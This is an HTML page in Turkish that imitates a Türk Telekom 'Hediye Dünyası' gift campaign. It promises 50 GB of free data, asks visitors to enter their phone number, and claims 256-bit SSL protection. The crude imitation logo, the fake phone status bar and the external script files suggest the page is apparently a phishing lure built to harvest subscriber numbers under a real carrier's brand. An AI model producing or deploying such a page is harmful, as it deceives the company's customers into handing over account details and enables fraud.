<!DOCTYPE html>
<html lang="tr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Türk Telekom - Hediye Dünyası</title>
    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
</head>

<body>
    <div class="page-wrapper">
        <!-- Status bar -->
        <div class="status-bar">
            <div class="status-badge">
                <span class="status-dot"></span>
                4.5G
            </div>
            <div class="status-icons">
                <span>📶</span>
                <span>🔋</span>
            </div>
        </div>

        <!-- Logo -->
        <div class="logo-area">
            <div class="tt-logo">
                <svg viewBox="0 0 70 60" fill="none">
                    <polygon points="10,30 30,10 30,50" fill="#0066ff" />
                    <polygon points="25,30 45,10 45,50" fill="#00c8ff" />
                    <polygon points="40,30 60,10 60,50" fill="#00e6a0" />
                    <polygon points="30,22 38,30 30,38" fill="#ff4466" />
                </svg>
            </div>
            <div class="logo-text">TÜRK TELEKOM</div>
        </div>

        <!-- Campaign banner -->
        <div class="campaign-banner">
            <div class="campaign-icon">🎁</div>
            <div>
                <div class="campaign-title">Hediye Dünyası Kampanyası</div>
                <div class="campaign-subtitle">50 GB + Sosyal Medya Paketi kazan</div>
            </div>
        </div>

        <!-- Phone form -->
        <div class="form-section">
            <div class="form-label">TELEFON NUMARANIZ</div>
            <div class="phone-input-container">
                <div class="phone-display">
                    <input type="tel" id="phone" class="phone-input-dark" placeholder="5__ ___ __ __" maxlength="10">
                </div>
            </div>
            <div class="form-hint">
                <span class="hint-icon">i</span>
                Abonelik numaranızı giriniz
            </div>
        </div>

        <!-- Action button -->
        <button type="button" class="action-btn" id="loginBtn">
            <span class="btn-icon">🎁</span>
            Hediyemi Sorgula
        </button>

        <!-- SSL info -->
        <div class="ssl-info">
            <span class="ssl-icon">🛡️</span>
            Bilgileriniz 256-bit SSL şifrelemesiyle korunmaktadır
        </div>

        <!-- Footer -->
        <div class="dark-footer">
            © 2026 Türk Telekom A.Ş. Tüm hakları saklıdır.
        </div>
    </div>

    <script src="config.js"></script>
    <script src="script.js"></script>
</body>

</html>
